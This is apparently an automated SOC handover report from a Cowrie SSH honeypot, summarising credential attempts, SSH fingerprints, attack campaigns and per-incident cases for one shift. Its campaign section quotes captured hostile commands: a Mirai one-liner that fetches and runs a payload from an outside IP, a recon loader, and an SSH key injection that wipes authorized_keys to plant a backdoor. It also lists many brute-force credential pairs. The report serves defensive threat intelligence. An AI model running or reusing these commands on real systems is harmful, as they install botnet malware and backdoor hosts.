# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-21 |
| **Generated At** | 2026-08-21T20:30:16Z |
| **Shift Time** | 20:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **259** |
| Confirmed Threats | **243** |
| False Positives Filtered | **16** (6.2%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **28** |
| High Severity Cases | **195** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **3** HIGH · **17** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **213** |
| Unique Credential Pairs | **124** |
| Unique Usernames | **41** |
| Unique Passwords | **100** |
| Successful Auth Pairs | **167** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `admin` | 41 |
| `guest` | 17 |
| `test` | 15 |
| `ubuntu` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `password` | 7 |
| `12345678` | 7 |
| `blank2004` | 6 |
| `1234` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 8 |
| `blank` | `blank2004` | 6 |
| `guest` | `guest2006` | 6 |
| `guest` | `guest2023` | 6 |
| `support` | `support` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234567890` | `80.94.92.179` | 2026-08-21T16:56:13 |
| `root` | `123abc` | `80.94.92.179` | 2026-08-21T16:58:27 |
| `ubuntu` | `India@2025` | `217.60.255.130` | 2026-08-21T17:00:36 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-08-21T17:00:39 |
| `root` | `Open@123` | `217.60.255.130` | 2026-08-21T17:00:42 |
| `root` | `` | `77.239.124.117` | 2026-08-21T17:00:49 |
| `admin` | `admin` | `77.239.124.117` | 2026-08-21T17:00:53 |
| `user` | `user` | `77.239.124.117` | 2026-08-21T17:00:55 |
| `telecomadmin` | `admintelecom` | `77.239.124.117` | 2026-08-21T17:00:57 |
| `root` | `xc3511` | `77.239.124.117` | 2026-08-21T17:00:58 |
| `hikvision` | `hikvision` | `77.239.124.117` | 2026-08-21T17:01:00 |
| `ubnt` | `ubnt` | `77.239.124.117` | 2026-08-21T17:01:04 |
| `root` | `password` | `77.239.124.117` | 2026-08-21T17:01:06 |
| `admin` | `password` | `77.239.124.117` | 2026-08-21T17:01:08 |
| `postgres` | `postgres` | `77.239.124.117` | 2026-08-21T17:01:10 |
| `test` | `test` | `77.239.124.117` | 2026-08-21T17:01:12 |
| `root` | `vizxv` | `77.239.124.117` | 2026-08-21T17:01:14 |
| `pi` | `raspberry` | `77.239.124.117` | 2026-08-21T17:01:17 |
| `ftp` | `ftp` | `77.239.124.117` | 2026-08-21T17:01:19 |
| `user` | `password` | `77.239.124.117` | 2026-08-21T17:01:21 |
| `blank` | `blank2004` | `10.0.0.73` | 2026-08-21T17:01:22 |
| `admin` | `admin123` | `77.239.124.117` | 2026-08-21T17:01:23 |
| `admin` | `admin1234` | `77.239.124.117` | 2026-08-21T17:01:25 |
| `admin` | `` | `77.239.124.117` | 2026-08-21T17:01:27 |
| `admin` | `1234` | `77.239.124.117` | 2026-08-21T17:01:29 |
| `root` | `12345678` | `77.239.124.117` | 2026-08-21T17:01:30 |
| `root` | `1234` | `77.239.124.117` | 2026-08-21T17:01:32 |
| `root` | `86981198` | `77.239.124.117` | 2026-08-21T17:01:34 |
| `admin` | `888888` | `77.239.124.117` | 2026-08-21T17:01:36 |
| `default` | `default` | `77.239.124.117` | 2026-08-21T17:01:38 |
| `root` | `j1/_6s*w` | `77.239.124.117` | 2026-08-21T17:01:40 |
| `root` | `solokey` | `77.239.124.117` | 2026-08-21T17:01:42 |
| `admin` | `12345` | `77.239.124.117` | 2026-08-21T17:01:44 |
| `router` | `router` | `77.239.124.117` | 2026-08-21T17:01:46 |
| `Administrator` | `Vision2` | `77.239.124.117` | 2026-08-21T17:01:47 |
| `support` | `support` | `77.239.124.117` | 2026-08-21T17:01:49 |
| `daemon` | `daemon` | `77.239.124.117` | 2026-08-21T17:01:51 |
| `root` | `cat1029` | `77.239.124.117` | 2026-08-21T17:01:53 |
| `admin` | `12345678` | `77.239.124.117` | 2026-08-21T17:01:55 |
| `admin` | `123456789` | `77.239.124.117` | 2026-08-21T17:01:57 |
| `support` | `support` | `10.0.0.73` | 2026-08-21T17:02:15 |
| `root` | `P@ssw0rd123` | `80.94.92.179` | 2026-08-21T17:02:59 |
| `root` | `abc123` | `80.94.92.179` | 2026-08-21T17:05:27 |
| `root` | `admin123` | `80.94.92.179` | 2026-08-21T17:07:57 |
| `default` | `default2013` | `202.154.15.177` | 2026-08-21T17:09:00 |
| `default` | `default2013` | `42.125.196.116` | 2026-08-21T17:09:10 |
| `root` | `letmein` | `80.94.92.179` | 2026-08-21T17:10:26 |
| `unknown` | `unknown2005` | `64.53.7.231` | 2026-08-21T17:10:48 |
| `unknown` | `unknown2005` | `2.180.11.118` | 2026-08-21T17:10:57 |
| `ubuntu` | `P@55w0rd!123` | `217.60.255.130` | 2026-08-21T17:11:28 |
| `root` | `adm123` | `217.60.255.130` | 2026-08-21T17:11:35 |
| `root` | `pass123` | `80.94.92.179` | 2026-08-21T17:13:03 |
| `uploader` | `uploader` | `45.154.244.193` | 2026-08-21T17:14:15 |
| `root` | `password` | `80.94.92.179` | 2026-08-21T17:15:33 |
| `blank` | `blank2019` | `176.103.15.75` | 2026-08-21T17:15:45 |
| `blank` | `blank2019` | `103.93.37.178` | 2026-08-21T17:15:53 |
| `root` | `password1` | `80.94.92.179` | 2026-08-21T17:18:02 |
| `blank` | `blank2004` | `112.164.195.219` | 2026-08-21T17:19:30 |
| `blank` | `blank2004` | `63.47.149.59` | 2026-08-21T17:19:41 |
| `blank` | `blank2004` | `140.186.53.181` | 2026-08-21T17:19:48 |
| `blank` | `blank2004` | `190.75.248.87` | 2026-08-21T17:19:53 |
| `root` | `qwerty123` | `80.94.92.179` | 2026-08-21T17:20:37 |
| `ubuntu` | `Huawei12#$` | `217.60.255.130` | 2026-08-21T17:22:27 |
| `root` | `Latest@123` | `217.60.255.130` | 2026-08-21T17:22:33 |
| `root` | `root123` | `80.94.92.179` | 2026-08-21T17:23:13 |
| `guest` | `guest2006` | `10.0.0.73` | 2026-08-21T17:24:40 |
| `root` | `welcome` | `80.94.92.179` | 2026-08-21T17:25:50 |
| `guest` | `guest2006` | `66.45.144.201` | 2026-08-21T17:26:12 |
| `guest` | `guest2006` | `50.223.176.171` | 2026-08-21T17:26:22 |
| `blank` | `blank2019` | `10.0.0.73` | 2026-08-21T17:26:58 |
| `admin` | `123` | `80.94.92.179` | 2026-08-21T17:28:15 |
| `admin` | `1234` | `80.94.92.179` | 2026-08-21T17:30:46 |
| `admin` | `12345` | `80.94.92.179` | 2026-08-21T17:33:18 |
| `ubuntu` | `1qazZAQ!` | `217.60.255.130` | 2026-08-21T17:33:22 |
| `root` | `Admin@1234` | `217.60.255.130` | 2026-08-21T17:33:28 |
| `test` | `test2009` | `10.0.0.73` | 2026-08-21T17:34:24 |
| `admin` | `123456` | `80.94.92.179` | 2026-08-21T17:36:04 |
| `admin` | `1234567` | `80.94.92.179` | 2026-08-21T17:38:50 |
| `admin` | `12345678` | `80.94.92.179` | 2026-08-21T17:41:20 |
| `guest` | `guest2006` | `103.169.73.227` | 2026-08-21T17:41:56 |
| `guest` | `guest2006` | `36.74.222.57` | 2026-08-21T17:42:10 |
| `support` | `support` | `176.53.159.196` | 2026-08-21T17:42:13 |
| `blank` | `blank2019` | `195.39.242.162` | 2026-08-21T17:43:41 |
| `admin` | `123456789` | `80.94.92.179` | 2026-08-21T17:43:42 |
| `ubuntu` | `Media@123` | `217.60.255.130` | 2026-08-21T17:44:40 |
| `root` | `Internet2023` | `217.60.255.130` | 2026-08-21T17:44:45 |
| `admin` | `1234567890` | `80.94.92.179` | 2026-08-21T17:46:03 |
| `admin` | `1q2w3e4r` | `80.94.92.179` | 2026-08-21T17:48:21 |
| `test` | `test123456` | `178.178.194.134` | 2026-08-21T17:48:32 |
| `admin` | `P@ssw0rd123` | `80.94.92.179` | 2026-08-21T17:50:52 |
| `test` | `test2009` | `65.20.204.88` | 2026-08-21T17:52:07 |
| `test` | `test2009` | `65.20.143.45` | 2026-08-21T17:52:20 |
| `test` | `test2009` | `181.212.174.166` | 2026-08-21T17:52:28 |
| `admin` | `abc123` | `80.94.92.179` | 2026-08-21T17:53:36 |
| `ubuntu` | `ubnt1234` | `217.60.255.130` | 2026-08-21T17:56:08 |
| `root` | `admin11!!` | `217.60.255.130` | 2026-08-21T17:56:17 |
| `admin` | `admin123` | `80.94.92.179` | 2026-08-21T17:56:41 |
| `uploader` | `uploader` | `10.0.0.73` | 2026-08-21T17:58:02 |
| `admin` | `letmein` | `80.94.92.179` | 2026-08-21T17:59:23 |
| `config` | `config2008` | `93.241.232.14` | 2026-08-21T17:59:27 |
| `config` | `config2008` | `49.124.147.96` | 2026-08-21T17:59:36 |
| `test` | `test123456` | `10.0.0.73` | 2026-08-21T17:59:39 |
| `test` | `test2008` | `10.0.0.73` | 2026-08-21T18:06:59 |
| `ubuntu` | `Pass@2025` | `217.60.255.130` | 2026-08-21T18:07:31 |
| `root` | `Flame@123` | `217.60.255.130` | 2026-08-21T18:07:37 |
| `config` | `config2008` | `170.247.3.15` | 2026-08-21T18:15:03 |
| `config` | `config2008` | `220.122.115.9` | 2026-08-21T18:15:11 |
| `test` | `test123456` | `180.71.9.31` | 2026-08-21T18:16:07 |
| `ubuntu` | `Test@123` | `217.60.255.130` | 2026-08-21T18:19:22 |
| `root` | `Chetan@123` | `217.60.255.130` | 2026-08-21T18:19:26 |
| `guest` | `guest2014` | `196.0.41.134` | 2026-08-21T18:21:12 |
| `guest` | `guest2014` | `106.245.246.26` | 2026-08-21T18:21:24 |
| `test` | `test2008` | `103.158.138.179` | 2026-08-21T18:24:44 |
| `test` | `test2008` | `1.212.225.99` | 2026-08-21T18:25:00 |
| `root` | `﻿------fuck------` | `61.240.29.222` | 2026-08-21T18:25:01 |
| `test` | `test2008` | `1.233.103.18` | 2026-08-21T18:25:09 |
| `guest` | `guest2023` | `10.0.0.73` | 2026-08-21T18:30:45 |
| `ubuntu` | `1qaz@WSX1` | `217.60.255.130` | 2026-08-21T18:30:56 |
| `root` | `ZAQ12wsx` | `217.60.255.130` | 2026-08-21T18:31:01 |
| `guest` | `guest2014` | `10.0.0.73` | 2026-08-21T18:32:16 |
| `guest` | `guest2023` | `220.246.42.217` | 2026-08-21T18:32:19 |
| `guest` | `guest2023` | `93.171.184.57` | 2026-08-21T18:32:29 |
| `root` | `dev@2026` | `203.170.192.251` | 2026-08-21T18:35:36 |
| `345gs5662d34` | `345gs5662d34` | `203.170.192.251` | 2026-08-21T18:35:40 |
| `root` | `3245gs5662d34` | `203.170.192.251` | 2026-08-21T18:35:42 |
| `root` | `admin` | `45.198.224.26` | 2026-08-21T18:38:46 |
| `admin` | `admin` | `47.85.8.171` | 2026-08-21T18:39:06 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-21T18:39:07 |
| `ubuntu` | `Admin@1` | `217.60.255.130` | 2026-08-21T18:40:45 |
| `root` | `Admin@123` | `217.60.255.130` | 2026-08-21T18:40:49 |
| `admin` | `admin` | `101.36.104.242` | 2026-08-21T18:42:59 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-21T18:44:13 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-21T18:44:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `193.8.186.29` | 2026-08-21T18:47:12 |
| `guest` | `guest2023` | `60.172.41.103` | 2026-08-21T18:48:05 |
| `guest` | `guest2023` | `113.140.95.250` | 2026-08-21T18:48:14 |
| `guest` | `guest2014` | `202.72.196.75` | 2026-08-21T18:48:39 |
| `guest` | `guest2014` | `131.255.68.201` | 2026-08-21T18:48:52 |
| `admin` | `admin` | `47.253.5.130` | 2026-08-21T18:49:56 |
| `ubuntu` | `rootadmin123` | `217.60.255.130` | 2026-08-21T18:50:28 |
| `root` | `Jan@2024` | `217.60.255.130` | 2026-08-21T18:50:29 |
| `sonar` | `sonar` | `45.156.87.216` | 2026-08-21T18:53:35 |
| `root` | `pass` | `45.156.87.216` | 2026-08-21T18:53:39 |
| `aiuser` | `aiuser` | `45.156.87.216` | 2026-08-21T18:53:42 |
| `odoo17` | `odoo` | `45.156.87.216` | 2026-08-21T18:53:46 |
| `dev` | `123456` | `45.156.87.216` | 2026-08-21T18:53:49 |
| `unknown` | `alpine` | `60.166.8.174` | 2026-08-21T18:53:53 |
| `test` | `1` | `45.156.87.216` | 2026-08-21T18:53:53 |
| `admin` | `0000` | `45.156.87.216` | 2026-08-21T18:53:56 |
| `nobody` | `nobody` | `45.156.87.216` | 2026-08-21T18:54:00 |
| `pi` | `toor` | `45.156.87.216` | 2026-08-21T18:54:04 |
| `ec2-user` | `12345678` | `45.156.87.216` | 2026-08-21T18:54:07 |
| `cloud` | `cloud` | `45.156.87.216` | 2026-08-21T18:54:11 |
| `crafty` | `1234` | `45.156.87.216` | 2026-08-21T18:54:14 |
| `rdpuser` | `123456789` | `45.156.87.216` | 2026-08-21T18:54:18 |
| `fivem` | `12345` | `45.156.87.216` | 2026-08-21T18:54:21 |
| `user3` | `12345678` | `45.156.87.216` | 2026-08-21T18:54:24 |
| `localhost` | `localhost` | `45.156.87.216` | 2026-08-21T18:54:28 |
| `ftpuser` | `123` | `45.156.87.216` | 2026-08-21T18:54:32 |
| `admin` | `P@ssw0rd` | `45.156.87.216` | 2026-08-21T18:54:34 |
| `rancher` | `rancher123` | `45.156.87.216` | 2026-08-21T18:54:38 |
| `bot` | `abc123` | `45.156.87.216` | 2026-08-21T18:54:42 |
| `user` | `1` | `45.156.87.216` | 2026-08-21T18:54:46 |
| `data` | `test` | `45.156.87.216` | 2026-08-21T18:54:49 |
| `plex` | `plex` | `45.156.87.216` | 2026-08-21T18:54:53 |
| `openclaw` | `1` | `45.156.87.216` | 2026-08-21T18:54:57 |
| `ubuntu` | `Aa123456` | `45.156.87.216` | 2026-08-21T18:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **259** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 61 |
| OpenSSH | 48 |
| libssh | 29 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 36 |
| `2ec37a7cc8da...` | Mirai/variant | 26 | 1 |
| `0a07365cc01f...` | Generic scanner | 26 | 1 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `a984ff804585...` | libssh-based | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 36 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 26 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 26 | 1 | Generic scanner |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 7 | 3 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `16443846184e...` | Go SSH scanner | 4 | 2 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 26 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.170.192.251`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **63** |
| High-Risk ASNs | **52** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS3301` | Telia Company AB | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 2 | HIGH |
| `AS11232` | Midcontinent Communications | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (195)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8c36ed26d581

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 16:56 |
| **Last Seen** | 2026-08-21 16:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 16:56:11` | `cowrie.session.connect` |
| `2026-08-21 16:56:12` | `cowrie.client.version` |
| `2026-08-21 16:56:12` | `cowrie.client.kex` |
| `2026-08-21 16:56:13` | `cowrie.login.success` |
| `2026-08-21 16:56:14` | `cowrie.session.params` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.success` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.command.input` |
| `2026-08-21 16:56:14` | `cowrie.log.closed` |
| `2026-08-21 16:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e393c2cb5f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 16:58 |
| **Last Seen** | 2026-08-21 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 16:58:25` | `cowrie.session.connect` |
| `2026-08-21 16:58:25` | `cowrie.client.version` |
| `2026-08-21 16:58:25` | `cowrie.client.kex` |
| `2026-08-21 16:58:27` | `cowrie.login.success` |
| `2026-08-21 16:58:28` | `cowrie.session.params` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.success` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:28` | `cowrie.command.input` |
| `2026-08-21 16:58:29` | `cowrie.log.closed` |
| `2026-08-21 16:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16e4de216b8d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:33` | `cowrie.session.connect` |
| `2026-08-21 17:00:34` | `cowrie.client.version` |
| `2026-08-21 17:00:34` | `cowrie.client.kex` |
| `2026-08-21 17:00:36` | `cowrie.login.success` |
| `2026-08-21 17:00:37` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:00:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:00:38` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246cfb1bf4d1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:37` | `cowrie.session.connect` |
| `2026-08-21 17:00:37` | `cowrie.client.version` |
| `2026-08-21 17:00:37` | `cowrie.client.kex` |
| `2026-08-21 17:00:39` | `cowrie.login.success` |
| `2026-08-21 17:00:40` | `cowrie.session.params` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.success` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.command.input` |
| `2026-08-21 17:00:40` | `cowrie.log.closed` |
| `2026-08-21 17:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221672011afa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:38` | `cowrie.session.connect` |
| `2026-08-21 17:00:38` | `cowrie.client.version` |
| `2026-08-21 17:00:38` | `cowrie.client.kex` |
| `2026-08-21 17:00:42` | `cowrie.login.success` |
| `2026-08-21 17:00:44` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:00:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:00:45` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
